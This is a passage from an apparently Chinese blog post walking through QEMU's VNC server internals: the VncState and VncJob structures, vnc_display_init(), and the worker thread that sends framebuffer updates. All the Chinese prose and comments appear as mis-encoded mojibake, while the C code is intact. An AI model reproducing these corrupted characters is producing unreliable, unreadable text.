class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncState</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> magic;<br>    QIOChannelSocket *sioc; <span class="hljs-comment">/* The underlying socket */</span><br>    QIOChannel *ioc; <span class="hljs-comment">/* The channel currently used for I/O */</span><br>    guint ioc_tag;<br>    gboolean disconnecting;<br><br>    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);<br>    <span class="hljs-type">uint8_t</span> **lossy_rect; <span class="hljs-comment">/* Not an Array to avoid costly memcpy in</span><br><span class="hljs-comment">                           * vnc-jobs-async.c */</span><br><br>    VncDisplay *vd;<br>    VncStateUpdate update; <span class="hljs-comment">/* Most recent pending request from client */</span><br>    VncStateUpdate job_update; <span class="hljs-comment">/* Currently processed by job thread */</span><br>    <span class="hljs-type">int</span> has_dirty;<br>    <span class="hljs-type">uint32_t</span> features;<br>    <span class="hljs-type">int</span> absolute;<br>    <span class="hljs-type">int</span> last_x;<br>    <span class="hljs-type">int</span> last_y;<br>    <span class="hljs-type">uint32_t</span> last_bmask;<br>    <span class="hljs-type">size_t</span> client_width; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    <span class="hljs-type">size_t</span> client_height; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    VncShareMode share_mode;<br><br>    <span class="hljs-type">uint32_t</span> vnc_encoding;<br><br>    <span class="hljs-type">int</span> major;<br>    <span class="hljs-type">int</span> minor;<br><br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];<br>    QCryptoTLSSession *tls; <span class="hljs-comment">/* Borrowed pointer from channel, don&#x27;t free */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncStateSASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">bool</span> encode_ws;<br>    <span class="hljs-type">bool</span> websocket;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    VncClientInfo *info;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Job thread bottom half has put data for a forced update</span><br><span class="hljs-comment">     * into the output buffer. This offset points to the end of</span><br><span class="hljs-comment">     * the update data in the output buffer. This lets us determine</span><br><span class="hljs-comment">     * when a force update is fully sent to the client, allowing</span><br><span class="hljs-comment">     * us to process further forced updates. */</span><br>    <span class="hljs-type">size_t</span> force_update_offset;<br>    <span class="hljs-comment">/* We allow multiple incremental updates or audio capture</span><br><span class="hljs-comment">     * samples to be queued in output buffer, provided the</span><br><span class="hljs-comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span><br><span class="hljs-comment">     * is calculating dynamically based on framebuffer size</span><br><span class="hljs-comment">     * and audio sample settings in vnc_update_throttle_offset() */</span><br>    <span class="hljs-type">size_t</span> throttle_output_offset;<br>    Buffer output;<br>    Buffer input;<br>    <span class="hljs-comment">/* current output mode information */</span><br>    VncWritePixels *write_pixels;<br>    PixelFormat client_pf;<br>    <span class="hljs-type">pixman_format_code_t</span> client_format;<br>    <span class="hljs-type">bool</span> client_be;<br><br>    CaptureVoiceOut *audio_cap;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">audsettings</span> <span class="hljs-title">as</span>;</span><br><br>    VncReadEvent *read_handler;<br>    <span class="hljs-type">size_t</span> read_handler_expect;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">abort</span>;<br>    QemuMutex output_mutex;<br>    QEMUBH *bh;<br>    Buffer jobs_buffer;<br><br>    <span class="hljs-comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span><br><span class="hljs-comment">     *  update vnc_async_encoding_start()</span><br><span class="hljs-comment">     */</span><br>    VncTight *tight;<br>    VncZlib zlib;<br>    VncHextile hextile;<br>    VncZrle *zrle;<br>    VncZywrle zywrle;<br><br>    Notifier mouse_mode_notifier;<br><br>    QemuClipboardPeer cbpeer;<br>    QemuClipboardInfo *cbinfo;<br>    <span class="hljs-type">uint32_t</span> cbpending;<br><br>    QTAILQ_ENTRY(VncState) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨åŒä¸€ä¸ª VncDisplay ï¼ˆVNC Serverï¼‰ä¸‹çš„æ‰€æœ‰ VncStateï¼ˆVNC Clientï¼‰è¿æ¥æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€VncJob-å•ä¸ª-VNC-è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯">IIIã€VncJob - å•ä¸ª VNC è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯</h3><p>VncJob ç»“æ„ä½“ç”¨æ¥è¡¨ç¤ºå•ä¸ª VNC è¿æ¥ï¼ˆVncStateï¼‰å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯ï¼Œå®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJob</span></span><br><span class="hljs-class">&#123;</span><br>    VncState *vs;<br><br>    QLIST_HEAD(, VncRectEntry) rectangles;<br>    QTAILQ_ENTRY(VncJob) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨å•æ¬¡çš„å›¾åƒæ›´æ–°å½“ä¸­ï¼Œå•ä¸ªçŸ©å½¢åŒºåŸŸå…·ä½“çš„çš„æ›´æ–°ä¿¡æ¯ä½¿ç”¨ <code>VncRectEntry</code> ç»“æ„ä½“è¡¨ç¤ºï¼Œå•ä¸ª VncJob ä¸­å¯ä»¥æœ‰å¤šä¸ª VncRectEntryï¼Œä»–ä»¬ä¹‹é—´å½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> w;<br>    <span class="hljs-type">int</span> h;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRectEntry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span> <span class="hljs-title">rect</span>;</span><br>    QLIST_ENTRY(VncRectEntry) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¤šä¸ª VncJob ä¹‹é—´ä¹Ÿæ„æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œæœ€ç»ˆæŒ‚è½½åˆ°ä¸€ä¸ª <code>VncJobQueue</code> ç»“æ„ä½“ä¸Šï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc-jobs.c</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> &#123;</span><br>    QemuCond cond;<br>    QemuMutex mutex;<br>    QemuThread thread;<br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">exit</span>;<br>    QTAILQ_HEAD(, VncJob) jobs;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> <span class="hljs-title">VncJobQueue</span>;</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€çš„ VncJobQueueï¼Œé»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬ä¼šå°† VncJob æŒ‚è½½åˆ°ä¸Šé¢ï¼ŒåŒæ—¶ vnc worker threadï¼ˆè´Ÿè´£å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client çš„çº¿ç¨‹ï¼‰ä¹Ÿæ˜¯ä¸»è¦ä¾èµ–äºè¿™ä¸ªå…¨å±€çš„ queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We use a single global queue, but most of the functions are</span><br><span class="hljs-comment"> * already reentrant, so we can easily add more than one encoding thread</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> VncJobQueue *<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€vnc-display-init">ä¸€ã€vnc_display_init()</h2><p>è¯¥å‡½æ•°ä¸»è¦ä½œç”¨ä¾¿æ˜¯åˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> ç»“æ„ä½“ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_display_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *id, Error **errp)</span><br>&#123;<br>    VncDisplay *vd;<br><br>    <span class="hljs-keyword">if</span> (vnc_display_find(id) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    vd = g_malloc0(<span class="hljs-keyword">sizeof</span>(*vd));<br><br>    vd-&gt;id = strdup(id);<br>    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="hljs-comment">// åŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</span><br><br>    QTAILQ_INIT(&amp;vd-&gt;clients);<br>    vd-&gt;expires = TIME_MAX;<br><br>    <span class="hljs-keyword">if</span> (keyboard_layout) &#123;  <span class="hljs-comment">// åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</span><br>        trace_vnc_key_map_init(keyboard_layout);<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,<br>                                              keyboard_layout, errp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="hljs-string">&quot;en-us&quot;</span>, errp);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vd-&gt;kbd_layout) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;<br>    vd-&gt;connections_limit = <span class="hljs-number">32</span>;<br><br>    qemu_mutex_init(&amp;vd-&gt;mutex);<br>    vnc_start_worker_thread();  <span class="hljs-comment">// å¯åŠ¨ VNC çš„ worker çº¿ç¨‹</span><br><br>    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="hljs-comment">// è®¾ç½® DisplayChangeListener çš„ ops</span><br>    register_displaychangelistener(&amp;vd-&gt;dcl);<br>    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ª VncDisplayï¼ŒåŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</li><li>åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</li><li>å¯åŠ¨ VNC worker threadï¼ˆè‹¥æœªå¯åŠ¨ï¼‰ï¼Œç”± worker thread å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client</li><li>è®¾ç½®è¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener çš„ ops ä¸º <code>dcl_ops</code></li><li>è°ƒç”¨ <code>register_displaychangelistener()</code> æ³¨å†Œè¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener</li></ul><h3 id="Iã€VNC-worker-thread-å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯">Iã€VNC worker thread - å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯</h3><p><code>vnc worker thread</code> æ˜¯ Qemu ä¸­ VNC æœåŠ¡ä¸­çš„ä¸€ä¸ªé‡è¦çš„çº¿ç¨‹ï¼Œå…¶ç”¨ä»¥æŒç»­åœ°å¤„ç†æŒ‚è½½åœ¨å…¨å±€çš„ VncJobQueue ä¸Šçš„ VncJobï¼Œå¹¶å°†å›¾åƒæ›´æ–°æ•°æ®å‘é€ç»™ vnc å®¢æˆ·ç«¯</p><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ï¼Œå…¶è¿˜ä¼šè°ƒç”¨ <code>vnc_start_worker_thread()</code> å¯åŠ¨ vnc worker threadï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">vnc_worker_thread_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>; <span class="hljs-comment">/* Check global queue */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_start_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    VncJobQueue *q;<br><br>    <span class="hljs-keyword">if</span> (vnc_worker_thread_running())<br>        <span class="hljs-keyword">return</span> ;<br><br>    q = vnc_queue_init();<br>    qemu_thread_create(&amp;q-&gt;thread, <span class="hljs-string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,<br>                       QEMU_THREAD_DETACHED);<br>    <span class="hljs-built_in">queue</span> = q; <span class="hljs-comment">/* Set global queue */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥çº¿ç¨‹çš„æœ¬ä½“ä¾¿æ˜¯ <code>vnc_worker_thread</code> å‡½æ•°ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªé‡å¤è°ƒç”¨ <code>vnc_worker_thread_loop</code> çš„å¤§å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">vnc_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    VncJobQueue *<span class="hljs-built_in">queue</span> = arg;<br><br>    qemu_thread_get_self(&amp;<span class="hljs-built_in">queue</span>-&gt;thread);<br><br>    <span class="hljs-keyword">while</span> (!vnc_worker_thread_loop(<span class="hljs-built_in">queue</span>)) ;<br>    vnc_queue_clear(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> å®šä¹‰å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°ä¼šä¸€ç›´ç­‰å¾…åˆ°å…¨å±€çš„ VncJobQueue çš„ VncJob é“¾è¡¨éç©ºï¼Œå•æ¬¡è°ƒç”¨å¤„ç†ä¸€ä¸ª VncJobï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_worker_thread_loop</span><span class="hljs-params">(VncJobQueue *<span class="hljs-built_in">queue</span>)</span><br>&#123;<br>    VncJob *job;<br>    VncRectEntry *entry, *tmp;<br>    VncState vs = &#123;&#125;;<br>    <span class="hljs-type">int</span> n_rectangles;<br>    <span class="hljs-type">int</span> saved_offset;<br><br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);  <span class="hljs-comment">// ç­‰å¾…å…¨å±€ queue ä¸ä¸ºç©º</span><br>    <span class="hljs-keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        qemu_cond_wait(&amp;<span class="hljs-built_in">queue</span>-&gt;cond, &amp;<span class="hljs-built_in">queue</span>-&gt;mutex);<br>    &#125;<br>    <span class="hljs-comment">/* Here job can only be NULL if queue-&gt;exit is true */</span><br>    job = QTAILQ_FIRST(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs);  <span class="hljs-comment">// å–ä¸‹ç¬¬ä¸€ä¸ª job</span><br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    vnc_lock_output(job-&gt;vs);  <span class="hljs-comment">// é”ä¸Š VncState</span><br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span> || job-&gt;vs-&gt;<span class="hljs-built_in">abort</span> == <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// io channel ä¸ºç©ºæˆ– abort ä¸ºçœŸï¼Œæ–­å¼€è¿æ¥</span><br>        vnc_unlock_output(job-&gt;vs);<br>        <span class="hljs-keyword">goto</span> disconnected;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;<br>        <span class="hljs-comment">// è¿™é‡Œçš„ output ä¸º Buffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼ŒåŒ…å«ç€é•¿åº¦ä¸ä¸€ä¸ªæŒ‡å‘ buffer çš„æŒ‡é’ˆ</span><br>        <span class="hljs-comment">// buffer_move_empty(*to, *from) çš„ä½œç”¨å°±æ˜¯é‡Šæ”¾ to çš„ bufferï¼Œå°† from çš„ buffer ç»™åˆ° to çš„ buffer</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Looks like a NOP as it obviously moves no data.  But it</span><br><span class="hljs-comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span><br><span class="hljs-comment">         * one for vs.output</span><br><span class="hljs-comment">         */</span><br>        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>    <span class="hljs-comment">/* Make a local copy of vs and switch output buffers */</span><br>    vnc_async_encoding_start(job-&gt;vs, &amp;vs);<br>    vs.magic = VNC_MAGIC;<br><br>    <span class="hljs-comment">/* Start sending rectangles */</span><br>    n_rectangles = <span class="hljs-number">0</span>;<br>    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);<br>    vnc_write_u8(&amp;vs, <span class="hljs-number">0</span>);<br>    saved_offset = vs.output.offset;<br>    vnc_write_u16(&amp;vs, <span class="hljs-number">0</span>);<br><br>    vnc_lock_display(job-&gt;vs-&gt;vd);<br>    <span class="hljs-comment">// éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ client</span><br>    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;<br>        <span class="hljs-type">int</span> n;<br><br>        <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// io channel ä¸ºç©ºï¼Œæ–­å¼€è¿æ¥</span><br>            vnc_unlock_display(job-&gt;vs-&gt;vd);<br>            <span class="hljs-comment">/* Copy persistent encoding data */</span><br>            vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>            <span class="hljs-keyword">goto</span> disconnected;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;<br>            <span class="hljs-comment">// å‘é€ buffer</span><br>            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,<br>                                            entry-&gt;rect.w, entry-&gt;rect.h);<br><br>            <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) &#123;<br>                n_rectangles += n;<br>            &#125;<br>        &#125;<br>        g_free(entry);<br>    &#125;<br>    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);<br>    vnc_unlock_display(job-&gt;vs-&gt;vd);<br><br>    <span class="hljs-comment">/* Put n_rectangles at the beginning of the message */</span><br>    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    vs.output.buffer[saved_offset + <span class="hljs-number">1</span>] = n_rectangles &amp; <span class="hljs-number">0xFF</span>;<br><br>    vnc_lock_output(job-&gt;vs);<br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="hljs-literal">NULL</span>) &#123;<br>        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br><br>        qemu_bh_schedule(job-&gt;vs-&gt;bh);<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>        buffer_reset(&amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>disconnected:<br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);<br>    QTAILQ_REMOVE(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs, job, next);<br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    qemu_cond_broadcast(&amp;<span class="hljs-built_in">queue</span>-&gt;cond);<br>    g_free(job);<br>    vs.magic = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥å…¨å±€ queue çš„ job é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è¿›å…¥ç¡çœ ç­‰å¾…</li><li>é”ä¸Šç¬¬ä¸€ä¸ª jobï¼Œæ£€æŸ¥å¯¹åº” VncState çš„ IO channel æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ output buffer ï¼ˆBuffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼Œæœ‰é•¿åº¦å’ŒæŒ‡å‘å®é™… buffer çš„æŒ‡é’ˆï¼‰çš„ offset ä¸º 0ï¼Œåˆ™å°†å…¶ç»™åˆ°å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output bufferï¼ŒåŸ buffer è®¾ä¸º NULL</li><li>éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ clientï¼Œè‹¥ io channel ä¸ºç©ºï¼Œåˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ io channel ä¸ä¸ºç©ºï¼Œåˆ™å°†å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output buffer ç»™å›åŸ VncState</li><li>ï¼ˆç»“æŸå‘é€ï¼‰ä»å…¨å±€ queue 